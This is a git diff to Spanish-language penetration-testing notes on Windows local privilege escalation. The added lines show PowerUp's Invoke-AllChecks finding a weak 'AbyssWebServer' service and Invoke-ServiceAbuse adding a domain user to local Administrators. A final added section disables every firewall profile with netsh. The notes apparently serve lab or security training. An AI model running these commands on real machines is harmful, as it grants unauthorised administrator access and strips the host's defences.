@@ -1,6 +1,6 @@
 # Local Privilege Escalation (Enumeración)
 
-Tags: #AD #Windows #Powershell #PrivEsc #PowerUp #WinPeas #PowerSploit 
+Tags: #AD #Windows #Powershell #PrivEsc #PowerUp #WinPeas #PowerSploit #FirewallOff 
 
 ## PowerUP
 
@@ -18,6 +18,7 @@ Tags: #AD #Windows #Powershell #PrivEsc #PowerUp #WinPeas #PowerSploit
 ❯ Get-ModifiableService -Verbose        # Obtener los servicios cuya configuración puede modificar el usuario actual 
 ```
 ### PowerUp - privEsc local (Forma 1) 
+
 ```powershell
 # Si se encuentra un servicio corriendo en el escaneo de PowerUp y tiene estas características (AbuseFunction, CanRestart y Check) de la siguiente manera, se podría abusar para escalar privilegios:
 
@@ -39,6 +40,29 @@ Tags: #AD #Windows #Powershell #PrivEsc #PowerUp #WinPeas #PowerSploit
 Nota: 
 	- Despues de agregar el usuario al grupo se debe salir y volver a iniciar sesión
 ```
+
+### Abusar del servicio AByssWebServer encontrado en PowerUP
+
+```powershell 
+# PowerUp
+❯ Invoke-AllChecks
+# Ejecuta todos los checks de escalación de privilegios locales de PowerSploit/PowerUp. Identifica servicios con rutas sin comillas (Unquoted Service Path), servicios cuya configuración puede ser modificada por el usuario actual (weak service permissions), binarios de servicios reemplazables, tareas programadas mal configuradas, entre otros vectores comunes de privesc en Windows.
+
+# Servicios clave para escalar 
+1 AbyssWebServer con Check: 'Unquoted service paths' 
+2 AbyssWebServer con Check: 'Modifiable Service Files' y CanRestart: 'True'
+3 StartName: LocalSystem 
+4 ModifiableFileIdentityReference: Everyone 
+
+---  Hacer el abuso  ---
+❯ Invoke-ServiceAbuse -Name AbyssWebServer -Username 'dominio\usuario'
+# Abusa de un servicio con permisos débiles para agregar un usuario al grupo local de administradores. Modifica el binPath del servicio para ejecutar un comando arbitrario como SYSTEM.
+
+❯ net localgroup Administrators   # Verificar que hemos sido agregado al grupo Administrators 
+
+NOTA: Requiere cerrar sesión y volver a autenticarse para que sean asignados los nuevos permisos en memoria  
+```
+
 ## PowerSploit - Recon servers DC
 
 ```powershell 
@@ -64,4 +88,10 @@ Nota:
 # Es un binario compilado en C#
 
 ❯ winPEASx64.exe    
+```
+
+## Una vez siendo Admin desactivar Protección (Firewall)
+
+```powershell 
+❯ netsh advfirewall set allprofiles state off
 ```
